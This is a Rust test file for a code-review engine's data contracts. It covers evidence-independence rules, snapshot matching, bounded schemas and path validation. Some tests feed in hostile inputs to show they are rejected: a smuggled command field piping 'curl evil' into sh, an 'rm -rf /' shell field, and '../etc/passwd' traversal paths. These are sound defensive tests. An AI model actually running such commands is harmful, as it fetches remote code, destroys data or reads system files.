//! T02 contract tests: domain types, evidence invariants and generated schemas.

use razista_core::{
    AgentId, ArtifactId, BoundedVec, ChangeAttribution, ChangeKind, Coverage, Digest, ErrorCode,
    EvidenceClass, EvidenceId, EvidenceKind, EvidenceRef, FileMode, Finding, FindingId,
    HypothesisId, JobId, JobState, ManifestEntry, ObjectId, PreparationId, RepoPath, ResolvedScope,
    ResourceUsage, ReviewReport, ReviewRequest, SandboxRequest, ScopeMode, Severity, SnapshotId,
    SourceSpan, Text, Verification, VerificationId, VersionInfo, schema, validate_report,
    validate_request,
};
use razista_core::{
    ConsistencyEvidence, RepoId, Snapshot, SnapshotManifest, validate_report_against,
};
use serde_json::{Value, json};

// ---------- fixtures -------------------------------------------------------

const APP_PY: &[u8] = b"def add(a, b):\n    return a - b\n";

fn text<const MIN: usize, const MAX: usize>(s: &str) -> Text<MIN, MAX> {
    Text::new(s).expect("valid fixture text")
}

fn bvec<T, const MAX: usize>(items: Vec<T>) -> BoundedVec<T, MAX> {
    BoundedVec::new(items).expect("fixture within bounds")
}

fn app_entry() -> ManifestEntry {
    ManifestEntry {
        path: RepoPath::from_bytes(b"src/app.py").expect("path"),
        digest: Digest::of(APP_PY),
        mode: FileMode::Regular,
        size_bytes: APP_PY.len() as u64,
        line_count: 40,
        change: ChangeKind::Modified,
        base_digest: None,
        renamed_from: None,
    }
}

fn span(start: u32, end: u32) -> SourceSpan {
    SourceSpan {
        path: RepoPath::from_bytes(b"src/app.py").expect("path"),
        file_digest: Digest::of(APP_PY),
        start_line: start,
        end_line: end,
    }
}

struct Ids {
    discoverer: AgentId,
    verifier: AgentId,
    evidence: EvidenceId,
    reproduced_verification: VerificationId,
    diagnostic_verification: VerificationId,
    diagnostic_evidence: EvidenceId,
    h_reproduced: HypothesisId,
    h_diagnostic: HypothesisId,
    h_open: HypothesisId,
}

fn ids() -> Ids {
    Ids {
        discoverer: AgentId::new(),
        verifier: AgentId::new(),
        evidence: EvidenceId::new(),
        reproduced_verification: VerificationId::new(),
        diagnostic_verification: VerificationId::new(),
        diagnostic_evidence: EvidenceId::new(),
        h_reproduced: HypothesisId::new(),
        h_diagnostic: HypothesisId::new(),
        h_open: HypothesisId::new(),
    }
}

fn manifest_digest() -> Digest {
    Digest::of(b"snapshot manifest")
}

fn finding(
    ids: &Ids,
    hypothesis: HypothesisId,
    severity: Severity,
    class: EvidenceClass,
    verifications: Vec<VerificationId>,
) -> Finding {
    Finding {
        id: FindingId::new(),
        hypothesis_id: hypothesis,
        claim: text("add() subtracts instead of adding"),
        severity,
        evidence_class: class,
        introduced_by_change: ChangeAttribution::IntroducedByChange,
        discovered_by: ids.discoverer,
        locations: bvec(vec![span(1, 2)]),
        verification_ids: bvec(verifications),
        impact: text("Every caller receives a wrong sum."),
        reproduction_summary: Some(text("add(2, 2) returned 0; contract requires 4.")),
        limitations: bvec(vec![]),
    }
}

fn verification(
    ids: &Ids,
    id: VerificationId,
    hypothesis: HypothesisId,
    outcome: EvidenceClass,
    evidence: Vec<EvidenceId>,
) -> Verification {
    Verification {
        id,
        hypothesis_id: hypothesis,
        verifier_id: ids.verifier,
        evidence_ids: bvec(evidence),
        outcome,
        assumptions: bvec(vec![]),
    }
}

/// A valid report: one reproduced bug, one diagnostic, one unverified critical concern.
fn valid_report(ids: &Ids) -> ReviewReport {
    ReviewReport {
        schema_version: 1,
        job_id: JobId::new(),
        snapshot_id: SnapshotId::new(),
        status: JobState::Completed,
        scope: ResolvedScope {
            mode: ScopeMode::Worktree,
            base_commit: Some(ObjectId::new("a".repeat(40)).expect("oid")),
            head_commit: None,
            merge_parent: None,
            paths: bvec(vec![]),
            include_untracked: false,
        },
        findings: bvec(vec![finding(
            ids,
            ids.h_reproduced,
            Severity::High,
            EvidenceClass::RuntimeReproduced,
            vec![ids.reproduced_verification],
        )]),
        diagnostics: bvec(vec![finding(
            ids,
            ids.h_diagnostic,
            Severity::Low,
            EvidenceClass::DeterministicDiagnostic,
            vec![ids.diagnostic_verification],
        )]),
        open_questions: bvec(vec![finding(
            ids,
            ids.h_open,
            Severity::Critical,
            EvidenceClass::Unverified,
            vec![],
        )]),
        verifications: bvec(vec![
            verification(
                ids,
                ids.reproduced_verification,
                ids.h_reproduced,
                EvidenceClass::RuntimeReproduced,
                vec![ids.evidence],
            ),
            verification(
                ids,
                ids.diagnostic_verification,
                ids.h_diagnostic,
                EvidenceClass::DeterministicDiagnostic,
                vec![ids.diagnostic_evidence],
            ),
        ]),
        evidence_manifest: bvec(vec![
            EvidenceRef {
                evidence_id: ids.evidence,
                kind: EvidenceKind::Execution,
                producer: ids.verifier,
                digest: Digest::of(b"execution record"),
            },
            EvidenceRef {
                evidence_id: ids.diagnostic_evidence,
                kind: EvidenceKind::Diagnostic,
                producer: ids.verifier,
                digest: Digest::of(b"diagnostic record"),
            },
        ]),
        manifest_digest: manifest_digest(),
        sources: bvec(vec![app_entry()]),
        coverage: Coverage {
            files_in_scope: 1,
            files_reviewed: 1,
            gaps: bvec(vec![]),
        },
        versions: VersionInfo {
            engine: text("razista-review 0.1.0"),
            policy_digest: Digest::of(b"policy"),
            prompt_version: None,
            model: None,
        },
        resource_usage: ResourceUsage::default(),
    }
}

fn err_code<T: std::fmt::Debug>(r: razista_core::Result<T>) -> ErrorCode {
    r.expect_err("must be rejected").code()
}

fn report_schema() -> jsonschema::Validator {
    let schema = serde_json::to_value(schema::schema_for_name("ReviewReport").expect("known"))
        .expect("schema serialises");
    jsonschema::validator_for(&schema).expect("generated schema compiles")
}

// ---------- evidence invariants ------------------------------------------

#[test]
fn valid_report_passes_validation_and_schema() {
    let ids = ids();
    let report = valid_report(&ids);
    validate_report(&report).expect("valid report");
    let value = serde_json::to_value(&report).expect("serialise");
    assert!(report_schema().is_valid(&value));
    let back: ReviewReport = serde_json::from_value(value).expect("round trip");
    assert_eq!(back, report);
}

#[test]
fn confirmed_finding_requires_evidence() {
    let ids = ids();

    // No verification at all.
    let mut r = valid_report(&ids);
    r.findings = bvec(vec![finding(
        &ids,
        ids.h_reproduced,
        Severity::High,
        EvidenceClass::RuntimeReproduced,
        vec![],
    )]);
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);

    // Verification references no evidence.
    let mut r = valid_report(&ids);
    r.verifications.as_mut_slice()[0].evidence_ids = bvec(vec![]);
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);

    // Evidence id not present in the manifest.
    let mut r = valid_report(&ids);
    r.verifications.as_mut_slice()[0].evidence_ids = bvec(vec![EvidenceId::new()]);
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);

    // Referenced verification does not exist.
    let mut r = valid_report(&ids);
    r.findings.as_mut_slice()[0].verification_ids = bvec(vec![VerificationId::new()]);
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);

    // Verification outcome is weaker than the claimed class.
    let mut r = valid_report(&ids);
    r.verifications.as_mut_slice()[0].outcome = EvidenceClass::DeterministicDiagnostic;
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);
}

#[test]
fn verification_cannot_be_borrowed_by_another_finding() {
    // Review finding 1: finding B cites finding A's verification.
    let ids = ids();
    let mut r = valid_report(&ids);
    let mut borrower = r.findings.as_slice()[0].clone();
    borrower.id = FindingId::new();
    borrower.hypothesis_id = HypothesisId::new();
    borrower.claim = text("a different claim entirely");
    r.findings = bvec(vec![r.findings.as_slice()[0].clone(), borrower]);
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);
}

#[test]
fn evidence_cannot_back_two_verifications() {
    // Security review: a second hypothesis's verification reuses the first
    // finding's execution record.
    let ids = ids();
    let mut r = valid_report(&ids);
    let h2 = HypothesisId::new();
    let v2 = VerificationId::new();
    r.verifications
        .push(verification(
            &ids,
            v2,
            h2,
            EvidenceClass::RuntimeReproduced,
            vec![ids.evidence],
        ))
        .expect("bounded");
    let mut second = finding(
        &ids,
        h2,
        Severity::High,
        EvidenceClass::RuntimeReproduced,
        vec![v2],
    );
    second.claim = text("an unrelated claim");
    r.findings = bvec(vec![r.findings.as_slice()[0].clone(), second]);
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);
}

#[test]
fn verification_cited_by_two_findings_is_rejected() {
    let ids = ids();
    let mut r = valid_report(&ids);
    let mut twin = r.findings.as_slice()[0].clone();
    twin.id = FindingId::new();
    r.findings = bvec(vec![r.findings.as_slice()[0].clone(), twin]);
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);
}

#[test]
fn evidence_kind_must_match_claimed_class() {
    // Review finding 5: a runtime claim backed only by a diagnostic record.
    let ids = ids();
    let mut r = valid_report(&ids);
    r.evidence_manifest.as_mut_slice()[0].kind = EvidenceKind::Diagnostic;
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);

    let mut r = valid_report(&ids);
    r.evidence_manifest.as_mut_slice()[1].kind = EvidenceKind::Execution;
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);
}

#[test]
fn disproving_verification_blocks_publication() {
    let ids = ids();
    let mut r = valid_report(&ids);
    let challenge = VerificationId::new();
    r.verifications
        .push(Verification {
            id: challenge,
            hypothesis_id: ids.h_reproduced,
            verifier_id: AgentId::new(),
            evidence_ids: bvec(vec![]),
            outcome: EvidenceClass::Disproved,
            assumptions: bvec(vec![]),
        })
        .expect("bounded");
    r.findings.as_mut_slice()[0].verification_ids =
        bvec(vec![ids.reproduced_verification, challenge]);
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);
}

#[test]
fn evidence_producer_must_not_be_the_discoverer() {
    let ids = ids();
    let mut r = valid_report(&ids);
    r.evidence_manifest.as_mut_slice()[0].producer = ids.discoverer;
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);
}

#[test]
fn duplicate_sources_or_evidence_ids_are_rejected() {
    // Review finding 6.
    let ids = ids();
    let mut r = valid_report(&ids);
    let mut shadow = app_entry();
    shadow.digest = Digest::of(b"other bytes");
    r.sources.push(shadow).expect("bounded");
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);

    let mut r = valid_report(&ids);
    let dup = r.evidence_manifest.as_slice()[0].clone();
    r.evidence_manifest.push(dup).expect("bounded");
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);
}

fn snapshot_for(r: &ReviewReport) -> Snapshot {
    Snapshot {
        snapshot_id: r.snapshot_id,
        repo_id: RepoId::new(),
        resolved_scope: r.scope.clone(),
        manifest: SnapshotManifest {
            entries: bvec(vec![app_entry()]),
            skipped: bvec(vec![]),
        },
        consistency_evidence: ConsistencyEvidence {
            capture_passes: 2,
            manifest_digest: manifest_digest(),
        },
        gaps: bvec(vec![]),
    }
}

#[test]
fn report_sources_must_match_the_snapshot() {
    let ids = ids();
    let r = valid_report(&ids);
    let snap = snapshot_for(&r);
    validate_report_against(&r, &snap).expect("consistent with its snapshot");

    // Different snapshot id.
    let mut other = snap.clone();
    other.snapshot_id = SnapshotId::new();
    assert_eq!(
        err_code(validate_report_against(&r, &other)),
        ErrorCode::EvidenceInvalid
    );

    // Manifest digest mismatch.
    let mut other = snap.clone();
    other.consistency_evidence.manifest_digest = Digest::of(b"another capture");
    assert_eq!(
        err_code(validate_report_against(&r, &other)),
        ErrorCode::EvidenceInvalid
    );

    // Report invents bytes the snapshot never had.
    let mut forged = r.clone();
    let mut entry = app_entry();
    entry.digest = Digest::of(b"forged");
    entry.line_count = 999;
    forged.sources = bvec(vec![entry]);
    for f in forged
        .findings
        .as_mut_slice()
        .iter_mut()
        .chain(forged.diagnostics.as_mut_slice())
        .chain(forged.open_questions.as_mut_slice())
    {
        for s in f.locations.as_mut_slice() {
            s.file_digest = Digest::of(b"forged");
        }
    }
    validate_report(&forged).expect("self-consistent on its own");
    assert_eq!(
        err_code(validate_report_against(&forged, &snap)),
        ErrorCode::EvidenceInvalid
    );
}

#[test]
fn verifier_must_be_independent_of_discoverer() {
    let ids = ids();
    let mut r = valid_report(&ids);
    r.verifications.as_mut_slice()[0].verifier_id = ids.discoverer;
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);
}

#[test]
fn unverified_findings_cannot_populate_reproduced_bugs() {
    let ids = ids();
    for class in [
        EvidenceClass::Unverified,
        EvidenceClass::Inconclusive,
        EvidenceClass::DeterministicDiagnostic,
        EvidenceClass::BoundedStaticProof,
        EvidenceClass::Disproved,
    ] {
        let mut r = valid_report(&ids);
        r.findings.as_mut_slice()[0].evidence_class = class;
        assert_eq!(
            err_code(validate_report(&r)),
            ErrorCode::EvidenceInvalid,
            "{class:?} must not be listed as a reproduced bug"
        );
    }
}

#[test]
fn disproved_hypotheses_never_appear_in_report_sections() {
    let ids = ids();
    let mut r = valid_report(&ids);
    r.open_questions.as_mut_slice()[0].evidence_class = EvidenceClass::Disproved;
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);

    let mut r = valid_report(&ids);
    r.diagnostics.as_mut_slice()[0].evidence_class = EvidenceClass::Disproved;
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);
}

#[test]
fn severity_is_not_certainty() {
    let ids = ids();

    // A critical but unverified concern stays visible as an open question...
    let r = valid_report(&ids);
    assert_eq!(r.open_questions.as_slice()[0].severity, Severity::Critical);
    validate_report(&r).expect("critical unverified concern is a valid open question");

    // ...and severity cannot promote it into the reproduced list.
    let mut r = valid_report(&ids);
    let mut f = r.open_questions.as_slice()[0].clone();
    f.severity = Severity::Critical;
    r.findings = bvec(vec![f]);
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);

    // A low-severity bug with runtime evidence is still a reproduced bug.
    let mut r = valid_report(&ids);
    r.findings.as_mut_slice()[0].severity = Severity::Info;
    validate_report(&r).expect("severity does not gate eligibility");

    // The two vocabularies are disjoint types on the wire.
    assert!(serde_json::from_value::<Severity>(json!("runtime_reproduced")).is_err());
    assert!(serde_json::from_value::<EvidenceClass>(json!("critical")).is_err());
}

#[test]
fn source_span_must_reference_snapshot() {
    let ids = ids();
    let cases: Vec<(&str, SourceSpan)> = vec![
        ("path outside manifest", {
            let mut s = span(1, 2);
            s.path = RepoPath::from_bytes(b"src/other.py").expect("path");
            s
        }),
        ("digest mismatch", {
            let mut s = span(1, 2);
            s.file_digest = Digest::of(b"different bytes");
            s
        }),
        ("end beyond line count", span(1, 41)),
        ("start after end", span(5, 4)),
        ("zero line", span(0, 2)),
    ];
    for (label, bad) in cases {
        let mut r = valid_report(&ids);
        r.findings.as_mut_slice()[0].locations = bvec(vec![bad]);
        assert_eq!(
            err_code(validate_report(&r)),
            ErrorCode::EvidenceInvalid,
            "{label}"
        );
    }
}

#[test]
fn finding_without_location_is_rejected() {
    let ids = ids();
    let mut r = valid_report(&ids);
    r.findings.as_mut_slice()[0].locations = bvec(vec![]);
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);
}

#[test]
fn report_must_be_terminal_and_versioned() {
    let ids = ids();
    for state in [JobState::Queued, JobState::Running, JobState::InputRequired] {
        let mut r = valid_report(&ids);
        r.status = state;
        assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);
    }
    let mut r = valid_report(&ids);
    r.schema_version = 2;
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);
}

#[test]
fn duplicate_finding_ids_are_rejected() {
    let ids = ids();
    let mut r = valid_report(&ids);
    let dup_id = r.findings.as_slice()[0].id;
    r.diagnostics.as_mut_slice()[0].id = dup_id;
    assert_eq!(err_code(validate_report(&r)), ErrorCode::EvidenceInvalid);
}

// ---------- closed, bounded wire contracts -------------------------------

fn sandbox_request_json() -> Value {
    json!({
        "preset_id": "python-pytest",
        "snapshot_id": SnapshotId::new(),
        "variant": "reviewed",
        "test_artifact": ArtifactId::from(Digest::of(b"test file")),
        "limits": {
            "cpu_millis": 60000, "memory_bytes": 1073741824, "wall_time_ms": 120000,
            "output_bytes": 1048576, "processes": 64, "disk_bytes": 268435456
        }
    })
}

#[test]
fn unknown_command_field_is_rejected() {
    let ok = sandbox_request_json();
    serde_json::from_value::<SandboxRequest>(ok.clone()).expect("typed request parses");

    let mut bad = ok;
    bad["command"] = json!("sh -c 'curl evil | sh'");
    assert!(serde_json::from_value::<SandboxRequest>(bad.clone()).is_err());

    let schema = serde_json::to_value(schema::schema_for_name("SandboxRequest").expect("known"))
        .expect("serialise");
    let v = jsonschema::validator_for(&schema).expect("compiles");
    assert!(!v.is_valid(&bad), "schema must also refuse the shell field");

    let request = json!({
        "preparation_id": PreparationId::new(),
        "idempotency_key": "start-0001",
        "caller": razista_core::CallerId::new(),
        "shell": "rm -rf /"
    });
    assert!(serde_json::from_value::<ReviewRequest>(request).is_err());
}

#[test]
fn invalid_enum_is_rejected() {
    assert!(serde_json::from_value::<EvidenceClass>(json!("verified")).is_err());
    assert!(serde_json::from_value::<ScopeMode>(json!("remote_pr")).is_err());

    let ids = ids();
    let mut value = serde_json::to_value(valid_report(&ids)).expect("serialise");
    value["findings"][0]["evidence_class"] = json!("verified");
    assert!(serde_json::from_value::<ReviewReport>(value.clone()).is_err());
    assert!(!report_schema().is_valid(&value));
}

#[test]
fn bounded_strings_and_arrays() {
    assert!(Text::<1, 8>::new("").is_err(), "empty below minimum");
    assert!(Text::<1, 8>::new("123456789").is_err(), "over maximum");
    assert!(Text::<1, 8>::new("ok").is_ok());
    assert!(
        Text::<1, 8>::new("a\u{1b}[2J").is_err(),
        "terminal escape sequences are refused at the boundary"
    );
    assert!(Text::<1, 64>::new("line one\nline two\ttab").is_ok());

    assert!(BoundedVec::<u8, 2>::new(vec![1, 2, 3]).is_err());
    assert!(serde_json::from_value::<BoundedVec<u8, 2>>(json!([1, 2, 3])).is_err());
    assert!(serde_json::from_value::<Text<1, 8>>(json!("123456789")).is_err());

    // Schema mirrors the bounds.
    let ids = ids();
    let mut value = serde_json::to_value(valid_report(&ids)).expect("serialise");
    value["findings"][0]["claim"] = json!("x".repeat(5000));
    assert!(serde_json::from_value::<ReviewReport>(value.clone()).is_err());
    assert!(!report_schema().is_valid(&value));

    let mut value = serde_json::to_value(valid_report(&ids)).expect("serialise");
    let span = value["findings"][0]["locations"][0].clone();
    value["findings"][0]["locations"] = Value::Array(vec![span; 17]);
    assert!(serde_json::from_value::<ReviewReport>(value.clone()).is_err());
    assert!(!report_schema().is_valid(&value));
}

#[test]
fn schema_and_serde_agree_on_structural_fixtures() {
    let ids = ids();
    let good = serde_json::to_value(valid_report(&ids)).expect("serialise");
    type Mutation = Box<dyn Fn(&mut Value)>;
    let mutations: Vec<(&str, Mutation)> = vec![
        (
            "unknown top-level field",
            Box::new(|v| v["verdict"] = json!("secure")),
        ),
        (
            "bad id format",
            Box::new(|v| v["job_id"] = json!("not-a-uuid")),
        ),
        (
            "non-v7 uuid",
            Box::new(|v| v["job_id"] = json!("00000000-0000-4000-8000-000000000000")),
        ),
        (
            "bad digest",
            Box::new(|v| v["sources"][0]["digest"] = json!("md5:abc")),
        ),
        (
            "negative line",
            Box::new(|v| v["findings"][0]["locations"][0]["start_line"] = json!(-1)),
        ),
        (
            "missing required",
            Box::new(|v| {
                v.as_object_mut().expect("object").remove("coverage");
            }),
        ),
        (
            "control char in text",
            Box::new(|v| v["findings"][0]["impact"] = json!("bad\u{7}bell")),
        ),
    ];
    let validator = report_schema();
    for (label, mutate) in mutations {
        let mut bad = good.clone();
        mutate(&mut bad);
        let serde_rejects = serde_json::from_value::<ReviewReport>(bad.clone()).is_err();
        let schema_rejects = !validator.is_valid(&bad);
        assert!(serde_rejects, "serde accepted: {label}");
        assert!(schema_rejects, "schema accepted: {label}");
    }
}

// ---------- primitives ------------------------------------------------------

#[test]
fn ids_are_canonical_uuid_v7() {
    let id = JobId::new();
    let s = serde_json::to_value(id).expect("serialise");
    let s = s.as_str().expect("string");
    assert_eq!(s.len(), 36);
    assert_eq!(&s[14..15], "7");
    assert!(serde_json::from_value::<JobId>(json!(s.to_uppercase())).is_err());
    assert!(serde_json::from_value::<JobId>(json!(format!("{{{s}}}"))).is_err());
}

#[test]
fn digest_is_prefixed_sha256() {
    let d = Digest::of(b"abc");
    assert_eq!(
        d.as_str(),
        "sha256:ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
    );
    assert!(Digest::parse("sha256:ABC").is_err());
    assert!(Digest::parse(&format!("sha1:{}", "a".repeat(64))).is_err());
}

#[test]
fn repo_path_rejects_traversal_and_absolute_paths() {
    for bad in [
        &b"../etc/passwd"[..],
        b"/etc/passwd",
        b"src/../../x",
        b"src//x",
        b"./src",
        b"",
        b"src/\0x",
    ] {
        assert!(
            RepoPath::from_bytes(bad).is_err(),
            "{:?}",
            String::from_utf8_lossy(bad)
        );
    }
    assert!(serde_json::from_value::<RepoPath>(json!("../x")).is_err());
}

#[test]
fn non_utf8_path_round_trips_with_escaped_display() {
    let raw = b"src/caf\xe9 100%.py";
    let path = RepoPath::from_bytes(raw).expect("byte-safe path");
    let wire = serde_json::to_value(&path).expect("serialise");
    assert_eq!(wire, json!("src/caf%E9 100%25.py"));
    let back: RepoPath = serde_json::from_value(wire).expect("deserialise");
    assert_eq!(back.as_bytes(), raw);
    assert_eq!(back, path);
}

#[test]
fn request_validation_accepts_typed_request_and_rejects_bad_key() {
    let request = ReviewRequest {
        preparation_id: PreparationId::new(),
        idempotency_key: razista_core::IdempotencyKey::new("start-0001").expect("key"),
        caller: razista_core::CallerId::new(),
    };
    validate_request(&request).expect("valid");
    for bad in [
        "short",
        "has space here",
        "semi;colon-key",
        &"k".repeat(129),
    ] {
        assert!(razista_core::IdempotencyKey::new(bad).is_err(), "{bad}");
    }
}

#[test]
fn every_error_code_declares_retryability_and_coverage_impact() {
    for code in ErrorCode::ALL {
        let _ = code.retryable();
        let _ = code.coverage_impact();
    }
    assert!(!ErrorCode::PolicyDenied.retryable());
    assert!(ErrorCode::StoreUnavailable.retryable());
    assert!(!ErrorCode::EvidenceInvalid.retryable());
    assert!(!ErrorCode::IdempotencyConflict.retryable());
    assert!(!ErrorCode::JobTerminal.retryable());
    assert_eq!(ErrorCode::ALL.len(), 18);
}

// ---------- generated schemas ---------------------------------------------

#[test]
fn committed_schemas_match_generated() {
    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../schemas");
    for (name, generated) in schema::all() {
        let path = dir.join(format!("{name}.schema.json"));
        let committed = std::fs::read_to_string(&path).unwrap_or_else(|_| {
            panic!(
                "missing {}; run `cargo run --locked -p xtask -- schemas`",
                path.display()
            )
        });
        assert_eq!(
            committed,
            schema::render(&generated),
            "{name} schema is stale; run `cargo run --locked -p xtask -- schemas`"
        );
    }
}
